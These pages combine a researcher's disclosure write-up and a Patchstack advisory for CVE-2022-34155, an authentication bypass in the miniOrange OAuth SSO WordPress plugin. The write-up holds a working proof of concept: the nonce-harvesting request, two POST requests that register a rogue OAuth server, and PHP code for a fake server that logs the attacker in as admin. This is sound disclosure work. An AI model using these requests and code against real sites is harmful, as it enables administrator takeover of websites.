=== Content from lana.codes_d68c203e_20250110_121616.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### OAuth Single Sign On – SSO (OAuth Client) by miniOrange WordPress plugin Authentication Bypass

REPORT ID: 071fa6eb-2e54-43a1-b37f-1e562988b7d4

The plugin contains an Auth Bypass vulnerability. To bypass authentication, we only need to know the user’s username. Depending on whose username we know, which can be easily queried because it is usually public data, we may even be given an administrator role on the client’s website.

Note: The plugin was affected by Missing Authorization vulnerability too. There are a lot of vulnerabilities and bugs in the code. But the analysis only deals with Auth Bypass because it is the most serious vulnerability.

Note: To exploit the vulnerability, we need to log in with a user with any role.

#### Let’s check the plugin

The `MOOAuth_Wizard_Ajax` class adds the following action hook:

```
add_action( 'wp_ajax_mo_outh_ajax', array( $this, 'mo_oauth_ajax' ) );
```

The `mo_oauth_ajax()` function includes the following request handling:

```
$this->verify_nonce();

switch ( sanitize_text_field( $_POST['mo_oauth_option'] ) ) {
	case 'save_app':
		$this->save_app();
		break;
	case 'test_finish':
		$this->test_finish();
		break;
}
```

This appears to be nonce protected, but as we’ll see later, this can be bypassed.

The `save_app()` contains the following code:

```
$appslist[ $app['mo_oauth_app_name'] ] = $newapp;
update_option( 'mo_oauth_apps_list', $appslist );
```

So this adds and saves a new app, which in our case will be an oauth server. There is no capability check in the code.

#### Let’s see how we can exploit this vulnerability

The ajax function is nonce protected, so we could only access the ajax function using the token. However, the Setup Wizard page, where the nonce is located, also has missing authorizations.

We only need to send a GET request to get the nonce token.

The HTTP request to the <http://localhost/> which is a test WordPress website:

```
GET /wp-admin/admin.php?option=mo_oauth_client_setup_wizard HTTP/1.1
Host: localhost
```

and we search for the following field:

```
<input type="hidden" name="nonce" id="nonce" value="a583ca916b">
```

After that, we only need to send two POST requests to exploit this vulnerability.

The first HTTP request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

action=mo_outh_ajax&mo_oauth_option=save_app&mo_oauth_appId=other&mo_oauth_nonce=a583ca916b&mo_oauth_client_id=-&mo_oauth_client_secret=-&mo_oauth_app_name=other&mo_oauth_type=oauth&mo_oauth_input=username_attr%20authorizeurl%20accesstokenurl%20resourceownerdetailsurl&mo_oauth_authorizeurl=http%3A%2F%2Flocalhost%2Foauth-exploit.php%3Fauth%3D1&mo_oauth_accesstokenurl=http%3A%2F%2Flocalhost%2Foauth-exploit.php%3Ftoken%3D1&mo_oauth_resourceownerdetailsurl=http%3A%2F%2Flocalhost%2Foauth-exploit.php%3Fresource%3D1&mo_oauth_username_attr=user_login&mo_oauth_send_body=true
```

We use these values:

`action` (request action in WordPress): `mo_outh_ajax`

`mo_oauth_option`: `save_app`

`mo_oauth_nonce`: `a583ca916b` (which is the value found in the input)

`mo_oauth_client_id`: `-` (which can be anything, just don’t be empty)

`mo_oauth_client_secret`: `-` (which can be anything, just don’t be empty)

`mo_oauth_app_name`: `other`

`mo_oauth_type`: `oauth`

`mo_oauth_input`: `username_attr authorizeurl accesstokenurl resourceownerdetailsurl`

`mo_oauth_authorizeurl`: `http://localhost/oauth-exploit.php?auth=1` (auth endpoint)

`mo_oauth_accesstokenurl`: `http://localhost/oauth-exploit.php?token=1` (token endpoint)

`mo_oauth_resourceownerdetailsurl`: `http://localhost/oauth-exploit.php?resource=1` (resource endpoint)

`mo_oauth_username_attr`: `user_login` (for attribute mapping)

`mo_oauth_send_body`: `true` (enable)

This request saves the client app to the database.

The second HTTP request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

action=mo_outh_ajax&mo_oauth_option=test_finish&mo_oauth_nonce=a583ca916b
```

We use these values:

`action` (request action in WordPress): `mo_outh_ajax`

`mo_oauth_option`: `test_finish`

`mo_oauth_nonce`: `a583ca916b` (which is the value found in the input)

This request completes the wizard. Because it deletes the `mo_oauth_setup_wizard_app` option.

#### The exploit script

We have to create an exploit OAuth server, this can be implemented with a few lines of PHP code:

```
/** auth endpoint */
if ( isset( $_GET['auth'] ) ) {
	if ( isset( $_GET['response_type'] ) ) {
		if ( 'code' == $_GET['response_type'] ) {
			header( 'Location: ' . $_GET['redirect_uri'] . '/?' . http_build_query( array(
					'code' => '-', //can be anything, just don’t be empty
				) ) );
			exit;
		}
	}
}

/** token endpoint */
if ( isset( $_GET['token'] ) ) {
	if ( isset( $_POST['grant_type'] ) ) {
		echo json_encode( array(
			'access_token' => '-', //can be anything, just don’t be empty
		) );
		exit;
	}
}

/** resource endpoint */
if ( isset( $_GET['resource'] ) ) {
	echo json_encode( array(
		'user_login' => 'admin',
	) );
	exit;
}
```

Add the administrator’s username to the user\_login field at resource endpoint.

Upload it to our localhost server as `oauth-exploit.php` file.

#### Try it

Then, if we click on the Login with Other button at the WordPress login, the OAuth client connects to our exploit OAuth server, which returns the admin’s username, and then WordPress authenticates and logs us in.

Unfortunately, I can’t provide a demo for this plugin because it has so many vulnerabilities and bugs that it wouldn’t be too difficult to sandbox it.

### References

Source Code
<https://wordpress.org/plugins/miniorange-login-with-eve-online-google-facebook/>

Source Code (Archive)
<https://lana.solutions/files/miniorange-login-with-eve-online-google-facebook-6.23.3.zip>

Repository
<https://plugins.svn.wordpress.org/miniorange-login-with-eve-online-google-facebook/?p=2777244>

CVE
[CVE-2022-34155](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34155)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2022-08-24

Post Published
2022-08-26

Post Updated
2023-05-27

Affected Version
<= 6.23.3

### Classification

Type
Authentication Bypass, Missing Authorization

### Researcher

Name
[István Márton](https://lana.report "Visit István Márton’s website")

Email
[[email protected]](/cdn-cgi/l/email-protection#d8b1b6beb798b4b9b6b9f6bbb7bcbdab)

### Tags

authentication bypass
exploit
missing authorization
oauth
php
wordpress plugin

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=🐰&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

**Lana Passport**
Recommendation
×

Hey, you’re reading a publication about OAuth. Maybe you’re interested in our secure OAuth server plugin?

[Buy it ($89) from CodeCanyon.net](https://1.envato.market/lana-passport-oauth-20-server-for-wordpress)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report © 2024 All Rights Reserved.

Made with 💙 by [Lana Codes](https://lana.codes/)



=== Content from patchstack.com_ade8f3de_20250110_121617.html ===


[Pricing](https://patchstack.com/pricing/)
Solutions

[WordPress security

Instantly fix and mitigate vulnerabilities](https://patchstack.com/wordpress-security/)
[Plugin auditing

Paid auditing for WordPress vendors](https://patchstack.com/auditing/)
[Managed VDP

Start a security program for your plugin](https://patchstack.com/for-plugins/)
[Bug Bounty

Join the community and earn bounties](https://patchstack.com/bug-bounty/)
[Enterprise API

At scale monitoring and vPatching for hosts](https://patchstack.com/for-hosts/)
[Vulnerability database

The latest WordPress security intelligence](https://patchstack.com/database/)

[Login](https://app.patchstack.com/login)

[Start trial](https://app.patchstack.com/register?type=pro)

# WordPress OAuth Single Sign On – SSO (OAuth Client) Plugin <= 6.23.3 is vulnerable to Broken Authentication

![Patch priority: high](https://patchstack.com/database/img/priority-high.svg)

High priority

vPatch immediately

![Vulnerable version](https://patchstack.com/database/img/vulnerable_version.svg)

<= 6.23.3

Vulnerable version

![Fixed](https://patchstack.com/database/img/fix-available.svg)

6.23.4

Fixed version

[![](https://patchstack.com/database/img/platforms/WordPress.svg)](https://patchstack.com/database/wordpress/plugin/miniorange-login-with-eve-online-google-facebook)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

24 May 2023

# Risks

CVSS 8.8

This vulnerability is highly dangerous and expected to become mass exploited.

##### 8.8

### Broken Authentication

This can be abused by a malicious actor to perform action which normally should only be able to be executed by higher privileged users. These actions might allow the malicious actor to gain admin access to the website.

This is a general description of this vulnerability type, specific impact varies case by case.
CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way, but it is not ideal for CMSs.

# Solutions

We advise to mitigate or resolve the vulnerability immediately.

![Protect your website(s)](https://patchstack.com/database/img/shield-star.svg)
### Automatically mitigate vulnerabilities and keep your websites safe

Patchstack has issued a virtual patch to mitigate this issue by blocking any attacks until
you have updated to a fixed version.

#### Get the fastest vulnerability mitigation with Patchstack!

[Get Started](https://patchstack.com/pricing/)

![Update to version X or later](https://patchstack.com/database/img/update-checkmark.svg)
### Update to version 6.23.4 or later.

Update to version 6.23.4 or later to remove the vulnerability.
Patchstack users can turn on auto-update for vulnerable plugins only.

# Details

Software

OAuth Single Sign On – SSO (OAuth Client)

Type

Plugin

Vulnerable versions

<= 6.23.3

Fixed in

6.23.4

OWASP Top 10

A2: Broken Authentication

Classification

Broken Authentication

CVE

[CVE-2022-34155](https://www.cve.org/CVERecord?id=CVE-2022-34155)

Patch priority

High

CVSS severity

High
(8.8)

Developer

[Claim ownership](https://patchstack.com/for-plugins)

PSID

74c6748a10df

Credits

[![István Márton](https://patchstack.com/database/img/logomark-small.svg)](https://patchstack.com/database/researcher/46444da6-46e2-4b6b-9eff-b801e5f3e5ba)

Required privilege

Subscriber

Published

24 May, 2023

[Vulnerability details](https://lana.codes/lanavdb/071fa6eb-2e54-43a1-b37f-1e562988b7d4/)

![Remove and replace software](https://patchstack.com/database/img/expand.svg)
Have additional information or questions about this entry?
Let us know.

#### Found this useful? Support István Márton for reporting this vulnerability.

[Send thanks](https://www.buymeacoffee.com/lanacodes)

#### Found this report useful?

[Send thanks](https://www.buymeacoffee.com/lanacodes)

# Timeline

![Early warning sent out](https://patchstack.com/database/img/warning.svg)

Early warning sent out to Patchstack customers

24 May 2023

![Published by Patchstack](https://patchstack.com/database/img/info.svg)

Published by Patchstack

26 May 2023

Go to

[![WordPress](https://patchstack.com/database/img/platforms/WordPress.svg)
Plugin page](https://patchstack.com/database/wordpress/plugin/miniorange-login-with-eve-online-google-facebook)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.

# Weekly WordPress security intelligence delivered to your inbox.

![vPatch available](https://patchstack.com/database/img/envelope.svg)

Subscribe

### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

© 2025 Patchstack
[DPA](https://patchstack.com/data-processing-agreement-dpa/)
[Privacy Policy](https://patchstack.com/privacy-policy/)
[Terms & Conditions](https://patchstack.com/terms-and-conditions/)
![EU Logo](https://patchstack.com/database/img/eic-logo.png)

![](https://patchstack.com/database/img/logo.svg)
### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)

## Let us know if we have missed a vulnerability reported elsewhere

Report
![arrow right](https://patchstack.com/database/img/chevron-right.svg)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)
[Close](https://patchstack.com/database/)
## reCAPTCHA's verification failed!

## Thank you for contributing!

[Close](https://patchstack.com/database/)
![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)


